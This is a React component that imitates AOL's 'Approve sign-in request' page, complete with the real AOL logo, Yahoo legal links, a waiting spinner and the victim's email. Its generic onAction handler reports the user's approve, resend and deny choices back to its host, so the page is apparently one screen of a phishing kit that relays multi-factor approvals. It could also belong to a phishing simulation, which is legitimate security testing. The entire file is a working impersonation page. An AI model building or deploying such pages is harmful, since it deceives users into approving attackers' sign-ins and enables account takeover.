import React from 'react';
import { useLocation, useNavigate } from 'react-router-dom';

interface AolAuthPromptPageProps {
  onAction: (action: string, data?: Record<string, unknown>) => void;
}

const AolLogo = ({ className = '' }: { className?: string }) => (
  <img
    src="https://s.yimg.com/cv/apiv2/ybar/logos/aol-logo-black-v1.png"
    alt="AOL"
    className={`select-none ${className}`}
  />
);

const AolAuthPromptPage: React.FC<AolAuthPromptPageProps> = ({ onAction }) => {
  const location = useLocation();
  const navigate = useNavigate();
  const data = ((location.state as { data?: Record<string, unknown> } | null)?.data) || {};
  const email = (data.email as string) || ((location.state as { email?: string } | null)?.email) || '';
  const deviceName = (data.deviceName as string) || (data.device as string) || 'your device';

  return (
    <div className="min-h-screen flex flex-col bg-white" style={{ fontFamily: "'Helvetica Neue', Helvetica, Arial, sans-serif" }}>
      <main className="flex-grow w-full flex items-center justify-center p-4">
        <div className="w-full max-w-[400px] px-6 py-10">
          <div className="mb-8 flex justify-center">
            <AolLogo className="h-10" />
          </div>
          <h1 className="text-[22px] leading-7 font-normal text-black mb-2">Approve sign-in request</h1>
          <p className="text-sm text-gray-700 mb-6">
            We sent a sign-in notification to <strong>{deviceName}</strong>. Open your AOL app and tap <strong>Yes, allow</strong> to finish signing in.
          </p>
          {email && (
            <div className="text-xs text-gray-500 mb-4">Signed in as {email}</div>
          )}

          <div className="flex flex-col items-center justify-center bg-[#f7fbff] border border-[#d9e8f8] rounded-2xl py-10 px-6 mb-6">
            <div className="relative w-24 h-24 flex items-center justify-center mb-4">
              <div className="absolute inset-0 rounded-full border-4" style={{ borderColor: '#d9e8f8' }}></div>
              <div
                className="absolute inset-0 rounded-full border-4 border-transparent"
                style={{ borderTopColor: '#0073e6', animation: 'aolSpin 1.1s linear infinite' }}
              ></div>
              <svg className="w-10 h-10" viewBox="0 0 24 24" fill="none" stroke="#0073e6" strokeWidth="1.8">
                <rect x="6" y="2" width="12" height="20" rx="2" />
                <circle cx="12" cy="18" r="1.2" fill="#0073e6" />
              </svg>
            </div>
            <style>{`@keyframes aolSpin { to { transform: rotate(360deg); } }`}</style>
            <p className="text-sm font-medium" style={{ color: '#0073e6' }}>Waiting for approval&hellip;</p>
          </div>

          <p className="text-xs text-gray-600 text-center mb-6">
            This page will update automatically when you approve the request.
          </p>

          <div className="flex justify-between text-sm">
            <button
              type="button"
              onClick={() => onAction('resend_prompt')}
              className="hover:underline"
              style={{ color: '#0073e6' }}
            >
              Send a new request
            </button>
            <button
              type="button"
              onClick={() => { onAction('cancel'); navigate(-1); }}
              className="hover:underline"
              style={{ color: '#0073e6' }}
            >
              Use another method
            </button>
          </div>

          <button
            type="button"
            onClick={() => onAction('deny_authenticator')}
            className="mt-6 w-full py-2 border rounded-full text-sm font-medium"
            style={{ borderColor: '#0073e6', color: '#0073e6' }}
          >
            This wasn&rsquo;t me
          </button>
        </div>
      </main>
      <footer className="w-full max-w-[400px] mx-auto text-xs text-gray-500 text-center py-6">
        AOL &middot; <a href="https://legal.yahoo.com/us/en/yahoo/privacy/index.htm" className="hover:underline">Privacy</a> &middot; <a href="https://legal.yahoo.com/us/en/yahoo/terms/otos/index.htm" className="hover:underline">Terms</a>
      </footer>
    </div>
  );
};

export default AolAuthPromptPage;
